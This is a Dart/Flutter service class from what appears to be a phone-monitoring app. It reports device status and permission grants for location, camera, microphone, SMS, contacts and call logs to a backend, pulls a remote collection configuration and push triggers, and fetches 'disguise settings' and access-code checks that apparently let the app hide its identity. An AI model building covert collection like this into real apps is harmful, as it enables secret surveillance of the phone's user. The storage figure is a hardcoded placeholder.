import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:dio/dio.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/foundation.dart';
import 'package:geolocator/geolocator.dart';
import 'package:monitored_app/app/constants.dart';
import 'package:monitored_app/app/locator.dart';
import 'package:monitored_app/core/api/api_client.dart';
import 'package:monitored_app/core/services/battery_monitor_service.dart';
import 'package:monitored_app/core/services/connectivity_service.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/utils/device_utils.dart';
import 'package:monitored_app/core/utils/media_permission_utils.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:permission_handler/permission_handler.dart' hide ServiceStatus;

/// Service responsible for device management and server communication
/// Handles collection configuration, device status updates, and server communication
class DeviceService {
  final ApiClient _apiClient = locator<ApiClient>();
  final StorageService _storageService = locator<StorageService>();
  final BatteryMonitorService _batteryMonitorService =
      locator<BatteryMonitorService>();
  final ConnectivityService _connectivityService =
      locator<ConnectivityService>();

  Timer? _statusUpdateTimer;
  StreamSubscription<String>? _fcmTokenRefreshSubscription;
  Map<String, dynamic>? _collectionConfig;
  String? _lastRegisteredFcmToken;
  bool _isInitialized = false;

  static final DeviceService _instance = DeviceService._internal();
  factory DeviceService() => _instance;
  DeviceService._internal();

  /// Initialize the device service and start periodic status updates
  Future<void> initialize() async {
    if (_isInitialized) return;

    try {
      if (!await _hasValidSession()) {
        debugPrint(
            'DeviceService initialization skipped: no authenticated session yet');
        return;
      }

      if (await getServerDeviceId() == null) {
        debugPrint(
            'DeviceService initialization skipped: unable to resolve backend device UUID');
        return;
      }

      // Load collection configuration from server
      await loadCollectionConfiguration();

      // Start periodic device status updates (every 5 minutes)
      _statusUpdateTimer = Timer.periodic(
        const Duration(minutes: 5),
        (_) => updateDeviceStatus(),
      );

      // Send initial status update
      await updateDeviceStatus();
      await registerCurrentFcmToken();
      _startFcmTokenRefreshListener();

      _isInitialized = true;

      debugPrint('DeviceService initialized successfully');
    } catch (e) {
      debugPrint('Error initializing DeviceService: $e');
    }
  }

  /// Stop the device service and cleanup resources
  Future<void> dispose() async {
    _statusUpdateTimer?.cancel();
    _statusUpdateTimer = null;
    await _fcmTokenRefreshSubscription?.cancel();
    _fcmTokenRefreshSubscription = null;
    _lastRegisteredFcmToken = null;
    _isInitialized = false;
  }

  /// Load collection configuration from the server
  /// GET /data/collection-config/
  Future<Map<String, dynamic>?> loadCollectionConfiguration() async {
    try {
      final deviceId = await getServerDeviceId();
      if (deviceId == null) {
        debugPrint(
            'Collection configuration skipped: backend device UUID unavailable');
        return null;
      }

      final response = await _apiClient.get(
        '/data/collection-config/',
        queryParameters: {'device_id': deviceId},
      );

      if (response.statusCode == 200) {
        _collectionConfig = response.data as Map<String, dynamic>;

        // Store configuration locally for offline access
        await _storageService.setString(
            'collection_config', jsonEncode(response.data));

        debugPrint(
            'Collection configuration loaded: ${_collectionConfig?.keys}');
        return _collectionConfig;
      }

      return null;
    } on DioException catch (e) {
      final statusCode = e.response?.statusCode;
      if (statusCode == 401) {
        debugPrint('Collection configuration skipped: unauthorized (401)');
      } else if (statusCode == 404) {
        debugPrint(
            'Collection configuration endpoint returned 404 for current device UUID');
      } else {
        debugPrint('Error loading collection configuration: $e');
      }

      // Try to load from local storage as fallback
      try {
        final localConfig = _storageService.getString('collection_config');
        if (localConfig != null && localConfig.isNotEmpty) {
          final parsed = jsonDecode(localConfig);
          if (parsed is Map<String, dynamic>) {
            debugPrint('Using cached collection configuration');
            _collectionConfig = parsed;
            return _collectionConfig;
          }
        }
      } catch (cacheError) {
        debugPrint('Error loading cached config: $cacheError');
      }

      return null;
    } catch (e) {
      debugPrint('Error loading collection configuration: $e');

      // Try to load from local storage as fallback
      try {
        final localConfig = _storageService.getString('collection_config');
        if (localConfig != null && localConfig.isNotEmpty) {
          final parsed = jsonDecode(localConfig);
          if (parsed is Map<String, dynamic>) {
            debugPrint('Using cached collection configuration');
            _collectionConfig = parsed;
            return _collectionConfig;
          }
        }
      } catch (cacheError) {
        debugPrint('Error loading cached config: $cacheError');
      }

      return null;
    }
  }

  /// Get current collection configuration
  Map<String, dynamic>? getCollectionConfiguration() {
    return _collectionConfig;
  }

  /// Update device status to the server
  /// PATCH /devices/devices/{device_id}/
  Future<bool> updateDeviceStatus() async {
    try {
      if (!await _hasValidSession()) {
        debugPrint('Skipping device status update: no authenticated session');
        return false;
      }

      final deviceId = await getServerDeviceId();
      if (deviceId == null) {
        debugPrint(
            'Skipping device status update: backend device UUID unavailable');
        return false;
      }

      final batteryLevel =
          await _batteryMonitorService.getCurrentBatteryLevel();
      final isCharging = await _batteryMonitorService.isCharging();
      final networkStatus = await _connectivityService.checkConnectivity();
      final packageInfo = await PackageInfo.fromPlatform();

      // Get permission status for all required permissions
      final permissionsStatus = await _getPermissionsStatus();

      final statusData = {
        'battery_level': batteryLevel,
        'is_charging': isCharging,
        'is_online': networkStatus != NetworkStatus.offline,
        'last_sync': DateTime.now().toIso8601String(),
        'storage_available': await _getAvailableStorage(),
        'network_type': _getNetworkTypeName(networkStatus),
        'location_enabled': await _isLocationEnabled(),
        'permissions_status': permissionsStatus,
        'app_version': packageInfo.version,
        'os_version': await DeviceUtils.getOSVersion(),
        'device_model': await DeviceUtils.getDeviceModel(),
        'device_name': await DeviceUtils.getDeviceName(),
      };

      final response = await _apiClient.patch(
        '/devices/devices/$deviceId/',
        data: statusData,
      );

      if (response.statusCode == 200) {
        debugPrint('Device status updated successfully');
        return true;
      } else {
        debugPrint('Failed to update device status: ${response.statusCode}');
        return false;
      }
    } on DioException catch (e) {
      final statusCode = e.response?.statusCode;
      if (statusCode == 401) {
        debugPrint('Device status update skipped: unauthorized (401)');
      } else if (statusCode == 404) {
        debugPrint(
            'Device status update failed: endpoint or device UUID not found (404)');
      } else {
        debugPrint('Error updating device status: $e');
      }
      return false;
    } catch (e) {
      debugPrint('Error updating device status: $e');
      return false;
    }
  }

  /// Register the current Firebase Cloud Messaging token on the backend.
  ///
  /// FCM is an optimization path for immediate remote sync triggers. Failure to
  /// obtain or register the token is non-fatal because periodic sync continues
  /// to work without push.
  Future<bool> registerCurrentFcmToken() async {
    if (!_canUseFirebaseMessaging) {
      debugPrint(
          'FCM token registration skipped: Firebase Messaging unavailable');
      return false;
    }

    try {
      final token = await FirebaseMessaging.instance.getToken();
      return registerFcmToken(token);
    } on FirebaseException catch (e) {
      debugPrint('FCM token unavailable: ${e.code}');
      return false;
    } catch (e) {
      debugPrint('FCM token registration skipped: ${e.runtimeType}');
      return false;
    }
  }

  Future<bool> registerFcmToken(String? token) async {
    if (token == null || token.isEmpty) {
      debugPrint('FCM token registration skipped: token unavailable or empty');
      return false;
    }

    if (token == _lastRegisteredFcmToken) {
      return true;
    }

    try {
      if (!await _hasValidSession()) {
        debugPrint('Skipping FCM token registration: no authenticated session');
        return false;
      }

      final deviceId = await getServerDeviceId();
      if (deviceId == null) {
        debugPrint(
            'Skipping FCM token registration: backend device UUID unavailable');
        return false;
      }

      final response = await _apiClient.patch(
        '/devices/devices/$deviceId/',
        data: {'fcm_token': token},
      );

      final statusCode = response.statusCode ?? 0;
      if (statusCode >= 200 && statusCode < 300) {
        _lastRegisteredFcmToken = token;
        debugPrint('FCM token registered successfully');
        return true;
      }

      debugPrint('FCM token registration failed: HTTP $statusCode');
      return false;
    } on DioException catch (e) {
      debugPrint(
          'FCM token registration failed: HTTP ${e.response?.statusCode ?? 'unknown'}');
      return false;
    } catch (e) {
      debugPrint('FCM token registration failed: ${e.runtimeType}');
      return false;
    }
  }

  /// Get device details from server
  /// GET /devices/devices/{device_id}/
  Future<Map<String, dynamic>?> getDeviceDetails() async {
    try {
      final deviceId = await getServerDeviceId();
      if (deviceId == null) return null;

      final response = await _apiClient.get('/devices/devices/$deviceId/');

      if (response.statusCode == 200) {
        return response.data as Map<String, dynamic>;
      }

      return null;
    } catch (e) {
      debugPrint('Error getting device details: $e');
      return null;
    }
  }

  /// Get database statistics from server
  /// GET /data/database-statistics/
  Future<Map<String, dynamic>?> getDatabaseStatistics() async {
    try {
      final response = await _apiClient.get('/data/database-statistics/');

      if (response.statusCode == 200) {
        return response.data as Map<String, dynamic>;
      }

      return null;
    } catch (e) {
      debugPrint('Error getting database statistics: $e');
      return null;
    }
  }

  /// Get disguise settings from server
  /// GET /devices/devices/{device_id}/disguise_settings/
  Future<Map<String, dynamic>?> getDisguiseSettings() async {
    try {
      final deviceId = await getServerDeviceId();
      if (deviceId == null) return null;

      final response =
          await _apiClient.get('/devices/devices/$deviceId/disguise_settings/');

      if (response.statusCode == 200) {
        return response.data as Map<String, dynamic>;
      }

      return null;
    } catch (e) {
      debugPrint('Error getting disguise settings: $e');
      return null;
    }
  }

  /// Validate access code with server
  /// POST /devices/devices/{device_id}/validate_access/
  Future<Map<String, dynamic>?> validateAccessCode(
      String accessMethod, String accessCode) async {
    try {
      final deviceId = await getServerDeviceId();
      if (deviceId == null) return null;

      final response = await _apiClient.post(
        '/devices/devices/$deviceId/validate_access/',
        data: {
          'access_method': accessMethod,
          'access_code': accessCode,
        },
      );

      if (response.statusCode == 200) {
        return response.data as Map<String, dynamic>;
      }

      return null;
    } catch (e) {
      debugPrint('Error validating access code: $e');
      return null;
    }
  }

  // Private helper methods

  Future<bool> _hasValidSession() async {
    final token = await _storageService.read(AppConstants.tokenKey);

    if (token == null || token.isEmpty) {
      return false;
    }

    return true;
  }

  bool get _canUseFirebaseMessaging {
    return (Platform.isAndroid || Platform.isIOS) && Firebase.apps.isNotEmpty;
  }

  void _startFcmTokenRefreshListener() {
    if (_fcmTokenRefreshSubscription != null || !_canUseFirebaseMessaging) {
      return;
    }

    _fcmTokenRefreshSubscription =
        FirebaseMessaging.instance.onTokenRefresh.listen(
      (newToken) => unawaited(registerFcmToken(newToken)),
      onError: (Object error) {
        debugPrint('FCM token refresh listener error: ${error.runtimeType}');
      },
    );
  }

  Future<String?> getServerDeviceId() async {
    final cachedServerDeviceId =
        await _storageService.read(AppConstants.deviceIdKey);
    if (cachedServerDeviceId != null && cachedServerDeviceId.isNotEmpty) {
      if (_isBackendUuid(cachedServerDeviceId)) {
        return cachedServerDeviceId;
      }

      debugPrint(
          'Ignoring legacy cached device_id value (expected backend UUID): $cachedServerDeviceId');
      await _storageService.delete(AppConstants.deviceIdKey);
    }

    return _resolveServerDeviceIdFromApi();
  }

  Future<String?> _resolveServerDeviceIdFromApi() async {
    try {
      final localIdentifier = await _getLocalDeviceIdentifier();

      final response = await _apiClient.get('/devices/devices/');
      if (response.statusCode != 200 ||
          response.data is! Map<String, dynamic>) {
        return null;
      }

      final data = response.data as Map<String, dynamic>;
      final results = data['results'];
      if (results is! List) {
        return null;
      }

      for (final item in results) {
        if (item is! Map<String, dynamic>) continue;

        final deviceIdentifier = item['device_identifier'];
        final deviceId = item['id'];

        if (deviceIdentifier == localIdentifier &&
            deviceId is String &&
            deviceId.isNotEmpty &&
            _isBackendUuid(deviceId)) {
          await _storageService.write(AppConstants.deviceIdKey, deviceId);
          await _storageService.write(
            AppConstants.deviceIdentifierKey,
            localIdentifier,
          );
          return deviceId;
        }
      }

      if (results.length == 1 && results.first is Map<String, dynamic>) {
        final single = results.first as Map<String, dynamic>;
        final singleId = single['id'];
        if (singleId is String &&
            singleId.isNotEmpty &&
            _isBackendUuid(singleId)) {
          await _storageService.write(AppConstants.deviceIdKey, singleId);
          return singleId;
        }
      }

      return null;
    } catch (e) {
      debugPrint('Error resolving backend device UUID: $e');
      return null;
    }
  }

  Future<String> _getLocalDeviceIdentifier() async {
    final cached = await _storageService.read(AppConstants.deviceIdentifierKey);
    if (cached != null && cached.isNotEmpty) {
      return cached;
    }

    final localIdentifier = await DeviceUtils.getDeviceIdentifier();
    await _storageService.write(
        AppConstants.deviceIdentifierKey, localIdentifier);
    return localIdentifier;
  }

  bool _isBackendUuid(String value) {
    final uuidRegex = RegExp(
      r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$',
    );
    return uuidRegex.hasMatch(value);
  }

  Future<Map<String, String>> _getPermissionsStatus() async {
    final results = <String, PermissionStatus>{
      'location': await Permission.locationAlways.status,
      'camera': await Permission.camera.status,
      'microphone': await Permission.microphone.status,
      'contacts': await Permission.contacts.status,
      'sms': await Permission.sms.status,
      'call_log': await Permission.phone.status,
    };

    if (Platform.isAndroid && await _isAndroid13Plus()) {
      final photos = await Permission.photos.status;
      final videos = await Permission.videos.status;
      final audio = await Permission.audio.status;
      final aggregateMediaStatus =
          await MediaPermissionUtils.aggregateReadStatus();

      results['storage'] = aggregateMediaStatus;
      results['media_images'] = photos;
      results['media_video'] = videos;
      results['media_audio'] = audio;
    } else {
      results['storage'] = await Permission.storage.status;
    }

    return results.map(
      (key, value) => MapEntry(
        key,
        key.startsWith('media_')
            ? MediaPermissionUtils.serializeStatus(value)
            : _serializePermissionStatus(value),
      ),
    );
  }

  String _serializePermissionStatus(PermissionStatus status) {
    if (status.isGranted) return 'granted';
    if (status.isPermanentlyDenied) return 'permanently_denied';
    if (status.isDenied) return 'denied';
    if (status.isRestricted) return 'restricted';
    if (status.isLimited) return 'limited';
    if (status.isProvisional) return 'provisional';
    return 'unknown';
  }

  Future<bool> _isAndroid13Plus() async {
    if (!Platform.isAndroid) return false;
    final info = await DeviceInfoPlugin().androidInfo;
    return info.version.sdkInt >= 33;
  }

  Future<int> _getAvailableStorage() async {
    try {
      // Get available storage in bytes
      // This would need platform-specific implementation
      return 1024 * 1024 * 1024; // 1GB placeholder
    } catch (e) {
      debugPrint('Error getting available storage: $e');
      return 0;
    }
  }

  String _getNetworkTypeName(NetworkStatus status) {
    switch (status) {
      case NetworkStatus.wifi:
        return 'wifi';
      case NetworkStatus.mobile:
        return 'mobile';
      case NetworkStatus.offline:
        return 'offline';
      default:
        return 'unknown';
    }
  }

  Future<bool> _isLocationEnabled() async {
    try {
      return Geolocator.isLocationServiceEnabled();
    } catch (e) {
      debugPrint('Error checking location status: $e');
      return false;
    }
  }

  /// Get location collection interval from configuration
  int getLocationInterval() {
    final locationConfig = _collectionConfig?['location'];
    if (locationConfig is Map<String, dynamic>) {
      return locationConfig['interval_seconds'] as int? ?? 900;
    }
    return 900; // Default 15 minutes
  }

  /// Check if specific data collection is enabled
  bool isDataCollectionEnabled(String dataType) {
    final config = _collectionConfig?[dataType];
    if (config is Map<String, dynamic>) {
      return config['enabled'] as bool? ?? false;
    }
    return false;
  }

  /// Get collection configuration for specific data type
  Map<String, dynamic>? getDataTypeConfig(String dataType) {
    final config = _collectionConfig?[dataType];
    if (config is Map<String, dynamic>) {
      return config;
    }
    return null;
  }

  /// Force refresh configuration from server
  Future<bool> refreshConfiguration() async {
    try {
      final config = await loadCollectionConfiguration();
      return config != null;
    } catch (e) {
      debugPrint('Error refreshing configuration: $e');
      return false;
    }
  }
}
